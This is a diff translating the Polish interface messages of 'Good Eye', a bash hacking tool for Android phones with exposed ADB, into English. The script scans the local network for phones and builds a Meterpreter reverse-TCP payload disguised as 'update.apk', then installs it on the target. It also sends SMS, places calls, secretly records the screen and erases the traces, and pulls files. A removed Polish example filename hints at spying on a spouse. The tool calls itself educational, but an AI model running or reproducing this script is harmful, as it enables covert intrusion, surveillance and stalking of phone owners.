@@ -1,5 +1,6 @@
 #!/bin/bash
 
+# NOTE: only messages in script were translated. functions and variables are still in Polish.
 
 IP_brama="$(ip route | grep via | awk '{print$3}')"
 Moje_IP="$(ifconfig | grep 192 | awk '{print$2}')"
@@ -19,7 +20,7 @@ przygotuj_srodowisko()
 
 pokaz_dostepne_cele()
 {	
-	echo -e "\e[35m Dostepne cele w Twojej sieci to: \e[0m"
+	echo -e "\e[35m The available targets on your network are: \e[0m"
 	sudo nmap -sP $IP_brama/24 | grep 'report' | awk '{print$5$6}'
 	sudo ./goodeye.sh
 }
@@ -27,7 +28,7 @@ pokaz_dostepne_cele()
 polacz_z_celem()
 {
 	sudo nmap -sP $IP_brama/24 | grep 'report' | awk '{print$5$6}'	
-	echo "podaj IP celu"
+	echo "Provide the target's IP address."
 	read cel
 	sudo adb connect $cel:5555
 	sudo ./goodeye.sh
@@ -48,13 +49,13 @@ reboot_celu()
 
 generuj_ladunek()
 {	
-	echo " Podaj IP do komunikacji"
+	echo " Provide IP to communication"
 	read R_Moje_IP
-	echo " Podaj port do komunikacji"
+	echo " Provide port to communication"
 	read R_PORT
 	msfvenom --platform Android --arch dalvik -p android/meterpreter/reverse_tcp LHOST=$R_Moje_IP LPORT=$R_PORT R > update.apk
 	clear
-	echo " Ladunek wygenerowany "
+	echo " Payload generated. "
 	sudo ./goodeye.sh
 }
 
@@ -63,9 +64,9 @@ zaladuj_ladunek_do_celu()
 {
 	adb -s $UE install update.apk
 	clear
-	echo " Ladunek zaladowany do smartfona "
+	echo " Payload loaded into smartphone. "
 	sleep 2
-	echo " Usuwam ladunek z pamieci Kaliego "
+	echo " Deleting payload from computer. "
 	sudo rm update.apk
 	sudo ./goodeye.sh
 	
@@ -88,9 +89,9 @@ sciagnij_zdjecia()
 wyslij_SMS()
 {	
 	clear
-	echo " Podaj nr tel np. +48000000000"
+	echo " Specify phone number ex. +48000000000"
 	read phone
-	echo " Podaj tresc wiadomosci "
+	echo " Specify message to send. "
 	read message
 	adb shell service call isms 7 i32 0 s16 "com.android.mms.service" s16 "$phone" s16 "null" s16 "'$message'" s16 "null" s16 "null"
 	sudo ./goodeye.sh
@@ -98,14 +99,14 @@ wyslij_SMS()
 
 nagraj_ekran()
 {
-	echo " Podaj nazwe pliku koncowego nagrania. np. dowod_zdrady_meza.mp4 "
+	echo " Provide the name of recording output file. "
 	read file_name
-	echo " Podaj czas nagrania. Max 180 sekund "
+	echo " Provide the time of recording in seconds. (max 180s) "
 	read time 
 	adb shell screenrecord /sdcard/$file_name.mp4 --time-limit $time
-	echo "Trwa pobieranie pliku..."
+	echo "Downloading file..."
 	adb pull /sdcard/$file_name.mp4
-	echo "Trwa kasowanie pliku na urzadzeniu..."
+	echo "Deleting file from device..."
 	adb shell rm /sdcard/$file_name.mp4
 	sudo chmod 777 $file_name.mp4
 	sudo ./goodeye.sh
@@ -113,7 +114,7 @@ nagraj_ekran()
 
 otworz_strone()
 {
-	echo " Podaj adres strony do otwarcia na urzadzeniu, ex. https://www.google.pl "
+	echo " Provide the website addres to open on device. for example: www.google.com "
 	read website
 	adb shell input keyevent 82
 	sleep 2
@@ -129,9 +130,9 @@ rozlacz_devices()
 
 zaladuj_i_uruchom_dzwiek()
 {	
-	echo " Podaj sciezke do zaladowania pliku wav. ex /home/kali/Desktop/kot.wav"
+	echo " Specify the path to the file ex. /home/kali/Desktop/test.wav"
 	read sciezka
-	echo "Podaj nazwe pliku ex. kot.wav"
+	echo "Specify the name of the file ex. test.wav"
 	read nazwa_pliku 
 	adb push $sciezka /sdcard
 	adb shell am start -a android.intent.action.VIEW -d file:///sdcard/$nazwa_pliku -t video/wav
@@ -148,47 +149,48 @@ zdalne_sterowanie()
 
 zadzwon_na_tel()
 {
-	echo " Podaj numer telefonu, na ktory chcesz zadzwonic, ex. +48000000000"
+	echo " Provide the phone number to call. ex. +48000000000"
 	read numer_telefonu_zadzwon
 	adb shell am start -a android.intent.action.CALL -d tel:$numer_telefonu_zadzwon
 	sudo ./goodeye.sh
 }
 
 figlet GOOD EYE
-echo "Hakowanie androida nigdy nie bylo tak latwe."
+echo "Hacking Android has never been so easy."
 
 echo "|---------------------------------|"
-echo "| Stworzono przez Przemyslaw Szmaj|"
-echo "| INSTA: _h4ker                   |"
-echo "| STRONA: www.ehaker.pl           |"
-echo "| Good Eye, wersja 1.3            |"
-echo "| Narzedzie stworzone w celu      |"
-echo "| EDUKACYJNYM                     |"
+echo "| Made by Przemyslaw Szmaj        |"
+echo "| Translated by sxnvte            |"
+echo "| INSTAGRAM: _h4ker               |"
+echo "| WEBSITE: www.ehaker.pl          |"
+echo "| Good Eye, version 1.3           |"
+echo "| The tool created for            |"
+echo "| EDUCATIONAL purposes.           |"
 echo "|---------------------------------|"
 
 
 echo " "
-echo "PODLACZONO DO: " 
+echo "CONNECTED TO: " 
 adb devices | awk '{print$1}'
 
 
 echo ""
-echo -e " [00]  \e[31m Rozlacz urzadzenia \e[0m"
-echo -e " [01]  \e[31m Przygotuj srodowisko \e[0m"	
-echo -e " [02]  \e[31m Pokaz dostepne cele w sieci \e[0m"
-echo -e " [03]  \e[31m Pokaz podlaczone cele \e[0m"
-echo -e " [04]  \e[31m Polacz z celem \e[0m"
-echo -e " [05]  \e[31m Reboot celu \e[0m"
-echo -e " [06]  \e[31m Wygeneruj ladunek do zainfekowania celu \e[0m"
-echo -e " [07]  \e[31m Wgraj ladunek do celu \e[0m"
-echo -e " [08]  \e[31m Uruchom ladunek w telefonie i przejmij kontrole \e[0m"
-echo -e " [09]  \e[31m Pobierz wszystkie pliki z telefonu \e[0m"
-echo -e " [10]  \e[31m Wyslij wiadomosc SMS \e[0m"
-echo -e " [11]  \e[31m Nagrywanie erkanu smartfona i zacieranie sladow \e[0m"
-echo -e " [12]  \e[31m Otworz strone www na urzadzeniu \e[0m "
-echo -e " [13]  \e[31m Zaladuj plik muzyczny i odtworz w smartfonie \e[0m "
-echo -e " [14]  \e[31m Zdalne sterowanie Smartfonem \e[0m "
-echo -e " [15]  \e[31m Zdalnie zadzwon na numer telefonu \e[0m "
+echo -e " [00]  \e[31m Disconnect devices \e[0m"
+echo -e " [01]  \e[31m Prepare the environment \e[0m"	
+echo -e " [02]  \e[31m Show available targets on the network \e[0m"
+echo -e " [03]  \e[31m Show connected targets \e[0m"
+echo -e " [04]  \e[31m Connect to target \e[0m"
+echo -e " [05]  \e[31m Reboot target \e[0m"
+echo -e " [06]  \e[31m Generate payload to infect target \e[0m"
+echo -e " [07]  \e[31m Upload payload to target \e[0m"
+echo -e " [08]  \e[31m Run payload on the phone and take control \e[0m"
+echo -e " [09]  \e[31m Download all files from the phone \e[0m"
+echo -e " [10]  \e[31m Send an SMS message \e[0m"
+echo -e " [11]  \e[31m Record smartphone screen and erase traces \e[0m"
+echo -e " [12]  \e[31m Open a website on the device \e[0m "
+echo -e " [13]  \e[31m Load a music file and play it on the smartphone \e[0m "
+echo -e " [14]  \e[31m Remote control of the smartphone \e[0m "
+echo -e " [15]  \e[31m Remotely call a phone number \e[0m "
 
 
 
